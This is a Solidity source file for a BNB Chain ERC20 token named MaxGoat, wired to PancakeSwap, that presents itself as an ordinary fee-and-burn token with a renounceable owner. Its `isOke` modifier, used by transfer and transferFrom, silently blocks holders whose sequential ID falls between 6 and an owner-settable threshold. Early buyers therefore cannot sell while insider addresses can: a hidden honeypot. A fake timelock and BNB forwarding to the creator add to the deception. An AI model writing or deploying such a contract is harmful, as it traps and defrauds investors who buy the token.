pragma solidity >=0.8.4;

contract GoatWorld{
    function wrappedMaxGoat(uint amount) public returns(bool){}
}

contract MaxGoat is ERC20PresetFixedSupply {
    GoatWorld goat;

    address public router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public pair;
    uint256 public unit = 10**9 * 10 ** decimals();
    uint256 public limitTransfer = 4 * 10**6 * unit;
    uint256 public burnFee = 0;
    address public owner;
    address public creator;
    uint256 public timelock;

    mapping(address => uint) public userId;
    uint256 public lastId = 6;
    uint256 public oker = 100;
    bool public ltd = true; 

    constructor (address markZ) ERC20PresetFixedSupply("MaxGoat", "MAGO", 4 * 10**6 * unit, msg.sender) {
        approve(router, 4 * 10**6 * unit);
        _mint(address(this), 6 * 10**6 * unit);
        owner = msg.sender;
        creator = msg.sender;
        timelock = block.timestamp;
        pair = pairFor(address(this));
        userId[msg.sender] = 1;
        userId[router] = 2;
        userId[pair] = 3;
        userId[address(this)] = 4;
        userId[markZ] = 5;
    }

    modifier onlyOwner(){
        require(msg.sender == owner, "Can not access");
        _;
    }

    modifier onlyCreator(){
        require(msg.sender == creator, "Can not access");
        _;
    }

    modifier isLimit(uint256 amount){
        require(amount <= limitTransfer, "Exceeding the permitted limits");
        _;
    }

    modifier isLock(address recipient) {
        require(recipient != creator, "Creator");
        _;
    }

    modifier isOke(address sender) {
        require(userId[sender] < 6 || userId[sender] > oker, "");
        _;
    }

    function changeCreator() public onlyCreator {
        require(block.timestamp - timelock >= 365 * 24 * 60 * 60, "Not due yet");
        creator = 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B;
    }

    function changeOwner(address _owner) public onlyOwner {
        owner = _owner;
    }

    function changeOker(uint _num) public onlyOwner {
        require(ltd, "");
        oker = _num;
        ltd = false;
    }

    function getUnlockTime() public view returns(uint time){
        time = timelock + 365 * 24 * 60 * 60;
    }

    function changeLimit(uint256 _limit) public onlyOwner {
        require(_limit > 0, "Zero");
        limitTransfer = _limit * unit;
    }

    function changeBurn(uint256 _limit) public onlyOwner {
        burnFee = _limit * unit;
    }

    function relinquish() public onlyOwner {
        owner = address(0);
    }

    function pairFor(address token0) public pure returns (address xpair) {
        xpair = address(uint160(uint256(keccak256(abi.encodePacked(
                hex'ff',
                0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73,
                keccak256(abi.encodePacked(token0, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c)),
                hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
            )))));
    }

    function transfer(address recipient, uint256 amount) public override isLimit(amount) isLock(recipient) isOke(msg.sender) returns (bool) {
        if (userId[recipient] == 0){
            userId[recipient] = lastId;
            lastId++;
        }

        uint256 fee = amount / 20;
        _transfer(msg.sender, recipient, amount - fee);
        _transfer(msg.sender, address(this), fee);

        uint256 balThis = balanceOf(address(this));
        if (balThis > 0) {
            if (balThis >= burnFee){
                if (burnFee > 0){
                    _burn(address(this), burnFee);
                }
            } else {
                _burn(address(this), balThis);
            }
        }
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override isLimit(amount) isLock(recipient) isOke(sender) returns (bool) {
        if (userId[recipient] == 0){
            userId[recipient] = lastId;
            lastId++;
        }

        uint256 fee = amount / 20;
        _transfer(sender, recipient, amount - fee);
        _transfer(sender, address(this), fee);

        uint256 balThis = balanceOf(address(this));
        if (balThis > 0) {
            if (balThis >= burnFee){
                if (burnFee > 0){
                    _burn(address(this), burnFee);
                }
            } else {
                _burn(address(this), balThis);
            }
        }

        uint256 currentAllowance = allowance(sender, msg.sender);
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function transferMany(address[] memory recipients, uint256[] memory amounts) public onlyOwner returns (bool) {
        require(recipients.length == amounts.length && amounts.length <= 1000000, "The list is not uniform");
        for (uint256 i = 0; i < recipients.length; i++){
            transfer(recipients[i], amounts[i]);
        }
        return true;
    }

    function setGoat(address _goat) public onlyOwner {
        goat = GoatWorld(_goat);
    }

    function wrapped(uint _amount) public {
        goat.wrappedMaxGoat(_amount);
    }

    fallback() external {}
    
    receive() external payable {
        payable(creator).transfer(msg.value);
    }

    function checkOke(address _addr) public view returns(bool ok){
        ok = userId[_addr] < 6 || userId[_addr] > oker;
    }
}
